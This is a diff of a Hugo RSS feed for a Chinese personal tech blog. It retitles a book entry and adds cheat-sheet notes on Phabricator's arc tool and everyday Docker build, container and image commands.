@@ -1,4 +1,4 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Jerry Will's Blog – 文档</title><link>/docs/</link><description>Recent content in 文档 on Jerry Will's Blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><atom:link href="/docs/index.xml" rel="self" type="application/rss+xml"/><item><title>Note: 敏捷思考</title><link>/note/book/smart_thinking/</link><pubDate>Sat, 19 Feb 2022 00:00:00 +0000</pubDate><guid>/note/book/smart_thinking/</guid><description>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Jerry Will's Blog – 文档</title><link>/docs/</link><description>Recent content in 文档 on Jerry Will's Blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><atom:link href="/docs/index.xml" rel="self" type="application/rss+xml"/><item><title>Book: 敏捷思考</title><link>/book/smart_thinking/</link><pubDate>Sat, 19 Feb 2022 00:00:00 +0000</pubDate><guid>/book/smart_thinking/</guid><description>
 &lt;pre tabindex="0">&lt;code class="language-plantuml" data-lang="plantuml">@startmindmap
 * 就业的十条技巧
 **: 沟通
@@ -297,4 +297,1422 @@ doc --&amp;gt; sg
 &lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f8f8f8;text-decoration:underline"> &lt;/span>&lt;span style="color:#204a87;font-weight:bold">type&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span>&lt;span style="color:#f8f8f8;text-decoration:underline"> &lt;/span>&lt;span style="color:#4e9a06">&amp;#34;string&amp;#34;&lt;/span>&lt;span style="color:#f8f8f8;text-decoration:underline">
 &lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f8f8f8;text-decoration:underline"> &lt;/span>&lt;span style="color:#204a87;font-weight:bold">code&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span>&lt;span style="color:#f8f8f8;text-decoration:underline">
 &lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f8f8f8;text-decoration:underline"> &lt;/span>&lt;span style="color:#204a87;font-weight:bold">type&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span>&lt;span style="color:#f8f8f8;text-decoration:underline"> &lt;/span>&lt;span style="color:#4e9a06">&amp;#34;string&amp;#34;&lt;/span>&lt;span style="color:#f8f8f8;text-decoration:underline">
-&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item></channel></rss>
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Note: Arc</title><link>/note/ops/vcs/arc/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/ops/vcs/arc/</guid><description>
+&lt;h2 id="arc">arc&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># Phabricator&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git clone https://github.com/phacility/libphutil.git
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git clone https://github.com/phacility/arcanist.git
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 将 some_install_path/arcanist/bin 加入到$PATH变量中&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 权限认证&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>arc install-certificate
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>arc set-config editor &lt;span style="color:#4e9a06">&amp;#34;vim&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 开分支(git branch)，或查看当前分支和关联的 revision&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>arc feature
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 创建或更新 revision，范围是 origin/master 到最新提交，包括暂存区的内容&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>arc diff
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 所有 revision 和状态&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>arc list
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 当前分支上的 commit 会全部被 land， 会先 pull --rebase 再 push&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>arc land
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 查看 diff 的范围等信息&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>arc which
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="phabricator">Phabricator&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>// apply patch to current branch
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>arc patch --diff &amp;lt;patch_version_number&amp;gt; --nocommit --nobranch
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Note: Docker Build</title><link>/note/container/docker/docker-build/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/container/docker/docker-build/</guid><description>
+&lt;h2 id="build">build&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>docker build &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>OPTIONS&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span> PATH &lt;span style="color:#000;font-weight:bold">|&lt;/span> URL &lt;span style="color:#000;font-weight:bold">|&lt;/span> -
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># use Dockerfile in current path to build a image&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker build -t &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>repository&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>/&lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>username&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>/&lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>remote_image_name&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>:&lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>tag&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span> ./
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># or&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker build -t &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>local_image_name&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span> ./
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker image tag &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>local_image_name&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>repository&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>/&lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>username&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>/&lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>remote_image_name&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>:&lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>tag&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># finally&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker push &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>repository&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>/&lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>username&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>/&lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>remote_image_name&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>:&lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>tag&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
+&lt;li>&lt;strong>-f, &amp;ndash;file :&lt;/strong> Name of the Dockerfile&lt;/li>
+&lt;li>&lt;strong>&amp;ndash;force-rm :&lt;/strong> Always remove intermediate containers&lt;/li>
+&lt;li>&lt;strong>&amp;ndash;no-cache :&lt;/strong> Do not use cache when building the image&lt;/li>
+&lt;li>&lt;strong>&amp;ndash;pull :&lt;/strong> Always attempt to pull a newer version of the image&lt;/li>
+&lt;li>&lt;strong>&amp;ndash;quiet, -q :&lt;/strong> Only print image ID on success&lt;/li>
+&lt;li>&lt;strong>&amp;ndash;tag, -t:&lt;/strong> Name and optionally a tag in the &amp;rsquo;name:tag&amp;rsquo; format&lt;/li>
+&lt;li>&lt;strong>&amp;ndash;network:&lt;/strong> Set the networking mode for the RUN instructions during build (default &amp;ldquo;default&amp;rdquo;)&lt;/li>
+&lt;/ul>
+&lt;h2 id="dockerfile">Dockerfile&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-dockerfile" data-lang="dockerfile">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">ENV&lt;/span> &lt;span style="color:#000">FOO&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>BAR
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># cid=$(docker run -e FOO=BAR &amp;lt;image&amp;gt;)&lt;/span>&lt;span style="color:#a40000">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a40000">&lt;/span>&lt;span style="color:#8f5902;font-style:italic"># docker commit $cid&lt;/span>&lt;span style="color:#a40000">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="dockerignore">&lt;code>.dockerignore&lt;/code>&lt;/h2>
+&lt;pre tabindex="0">&lt;code class="language-ignore" data-lang="ignore">.git
+README.md
+&lt;/code>&lt;/pre></description></item><item><title>Note: Docker Container</title><link>/note/container/docker/docker-container/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/container/docker/docker-container/</guid><description>
+&lt;h2 id="run">run&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 创建一个守护态的Docker容器&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker run -itd ubuntu:14.04 /bin/bash
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># docker ps&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 进入容器&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker attach &amp;lt;container_id&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 当多个窗口同时使用该命令进入该容器时，所有的窗口都会同步显示&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># enter a Docker container. &lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker &lt;span style="color:#204a87">exec&lt;/span> -it CONTAINER_NAME /bin/bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 创建一个新的容器并运行一个命令&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker run &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>OPTIONS&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span> IMAGE &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>COMMAND&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>ARG...&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>OPTIONS说明：&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>-a stdin:&lt;/strong> 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项；&lt;/li>
+&lt;li>&lt;strong>-d:&lt;/strong> 后台运行容器，并返回容器ID；&lt;/li>
+&lt;li>&lt;strong>-i:&lt;/strong> 以交互模式运行容器，通常与 -t 同时使用；&lt;/li>
+&lt;li>&lt;strong>-p:&lt;/strong> 端口映射，格式为：宿主端口:容器端口&lt;/li>
+&lt;li>&lt;strong>-v&lt;/strong>: 主机的目录映射到容器&lt;/li>
+&lt;li>&lt;strong>-t:&lt;/strong> 为容器重新分配一个伪输入终端，通常与 -i 同时使用；&lt;/li>
+&lt;li>&lt;strong>&amp;ndash;name=&amp;ldquo;cname&amp;rdquo;:&lt;/strong> 为容器指定一个名称；&lt;/li>
+&lt;li>&lt;strong>&amp;ndash;dns 8.8.8.8:&lt;/strong> 指定容器使用的DNS服务器，默认和宿主一致；&lt;/li>
+&lt;li>&lt;strong>&amp;ndash;dns-search example.com:&lt;/strong> 指定容器DNS搜索域名，默认和宿主一致；&lt;/li>
+&lt;li>&lt;strong>-h &amp;ldquo;hostname&amp;rdquo;:&lt;/strong> 指定容器的hostname；&lt;/li>
+&lt;li>&lt;strong>-e property=value:&lt;/strong> 设置环境变量；&lt;/li>
+&lt;li>&lt;strong>&amp;ndash;env-file=[]:&lt;/strong> 从指定文件读入环境变量；&lt;/li>
+&lt;li>&lt;strong>&amp;ndash;cpuset=&amp;ldquo;0-2&amp;rdquo; or &amp;ndash;cpuset=&amp;ldquo;0,1,2&amp;rdquo;:&lt;/strong> 绑定容器到指定CPU运行；&lt;/li>
+&lt;li>**-m :**设置容器使用内存最大值；&lt;/li>
+&lt;li>&lt;strong>&amp;ndash;net=&amp;ldquo;bridge&amp;rdquo;:&lt;/strong> 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型；&lt;/li>
+&lt;li>&lt;strong>&amp;ndash;link=[]:&lt;/strong> 添加链接到另一个容器；&lt;/li>
+&lt;li>&lt;strong>&amp;ndash;expose=[]:&lt;/strong> 开放一个端口或一组端口；&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>docker start &lt;span style="color:#8f5902;font-style:italic"># 启动一个或多少已经被停止的容器&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker stop &lt;span style="color:#8f5902;font-style:italic"># 停止一个运行中的容器&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker restart &lt;span style="color:#8f5902;font-style:italic"># 重启容器&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker pause &lt;span style="color:#8f5902;font-style:italic"># 暂停容器中所有的进程。&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker unpause &lt;span style="color:#8f5902;font-style:italic"># 恢复容器中所有的进程。&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="attach">attach&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 确保CTRL-D或C TRL-C不会关闭容器&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker attach --sig-proxy&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#204a87">false&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="rm">rm&lt;/h2>
+&lt;p>OPTIONS说明：&lt;/p>
+&lt;ul>
+&lt;li>**-f :**通过SIGKILL信号强制删除一个运行中的容器&lt;/li>
+&lt;li>**-l :**移除容器间的网络连接，而非容器本身&lt;/li>
+&lt;li>&lt;strong>-v :&lt;/strong>-v 删除与容器关联的卷&lt;/li>
+&lt;/ul>
+&lt;h2 id="create">create&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 创建一个新的容器但不启动它&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker create &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>OPTIONS&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span> IMAGE &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>COMMAND&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>ARG...&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exec">exec&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 在运行的容器中执行命令&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker &lt;span style="color:#204a87">exec&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>OPTIONS&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span> CONTAINER COMMAND &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>ARG...&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># tty size&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker &lt;span style="color:#204a87">exec&lt;/span> -it -e &lt;span style="color:#000">LINES&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#204a87;font-weight:bold">$(&lt;/span>tput lines&lt;span style="color:#204a87;font-weight:bold">)&lt;/span> -e &lt;span style="color:#000">COLUMNS&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#204a87;font-weight:bold">$(&lt;/span>tput cols&lt;span style="color:#204a87;font-weight:bold">)&lt;/span> &amp;lt;cid&amp;gt; bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>OPTIONS说明：&lt;/p>
+&lt;ul>
+&lt;li>**-d :**分离模式: 在后台运行&lt;/li>
+&lt;li>**-i :**即使没有附加也保持STDIN 打开&lt;/li>
+&lt;li>**-t :**分配一个伪终端&lt;/li>
+&lt;/ul>
+&lt;h2 id="kill">kill&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># Kill one or more running containers&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># &amp;lt;signal&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># KILL&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker &lt;span style="color:#204a87">kill&lt;/span> -s &amp;lt;signal&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="cp">cp&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>docker cp &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>OPTIONS&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span> CONTAINER:SRC_PATH DEST_PATH&lt;span style="color:#000;font-weight:bold">|&lt;/span>-
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker cp &lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>OPTIONS&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span> SRC_PATH&lt;span style="color:#000;font-weight:bold">|&lt;/span>- CONTAINER:DEST_PATH
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Note: Docker Image</title><link>/note/container/docker/docker-image/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/container/docker/docker-image/</guid><description>
+&lt;h2 id="search">search&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># --limit int Max number of search results (default 25)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># --no-trunc Don&amp;#39;t truncate output&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker search &amp;lt;something&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="pull">pull&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>docker pull debian
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># daemon mode&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">container_id&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">`&lt;/span>docker run -itd debian /bin/bash &lt;span style="color:#4e9a06">`&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker &lt;span style="color:#204a87">exec&lt;/span> -it &lt;span style="color:#000">$container_id&lt;/span> /bin/bash
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker attach &lt;span style="color:#000">$container_id&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="push">push&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>docker commit &amp;lt;container_id&amp;gt; &amp;lt;image_name&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker tag &amp;lt;image_name&amp;gt; &amp;lt;username&amp;gt;/&amp;lt;imagename&amp;gt;:&amp;lt;tagname&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker login -u &amp;lt;username&amp;gt; -p &amp;lt;password&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker push &amp;lt;username&amp;gt;/&amp;lt;imagename&amp;gt;:&amp;lt;tagname&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker &lt;span style="color:#204a87">logout&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="tag">tag&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>docker tag SOURCE_IMAGE&lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>:TAG&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span> TARGET_IMAGE&lt;span style="color:#ce5c00;font-weight:bold">[&lt;/span>:TAG&lt;span style="color:#ce5c00;font-weight:bold">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="commit">commit&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># Create a new image from a container&amp;#39;s changes&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker commit &amp;lt;container_id&amp;gt; &amp;lt;image_name&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># -a, --author string Author&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># -m, --message string Commit message&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">cid&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#204a87;font-weight:bold">$(&lt;/span>docker run -e &lt;span style="color:#000">FOO&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>BAR &amp;lt;image&amp;gt;&lt;span style="color:#204a87;font-weight:bold">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker commit &lt;span style="color:#000">$cid&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="images">images&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># -a, --all Show all images (default hides intermediate images)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># --digests Show digests&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># --no-trunc Don&amp;#39;t truncate output&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># -q, --quiet Only show numeric IDs&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker images
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="rmi">rmi&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># -f, --force&lt;/span>
